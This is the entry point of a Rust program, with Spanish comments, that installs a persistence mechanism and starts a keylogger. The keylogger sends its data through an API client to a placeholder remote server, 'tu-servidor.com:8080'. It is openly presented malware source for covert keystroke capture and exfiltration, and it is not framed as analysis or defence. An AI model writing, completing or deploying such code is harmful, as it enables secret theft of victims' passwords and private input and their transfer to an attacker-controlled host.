mod keylogger;
mod api;
mod persistence;

use api::ApiClient;
use std::sync::Arc;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Instalar persistencia (solo primera vez)
    persistence::install()?;

    // Iniciar keylogger
    let api_client = Arc::new(ApiClient::new("http://tu-servidor.com:8080"));
    keylogger::start(api_client)?;

    Ok(())
}
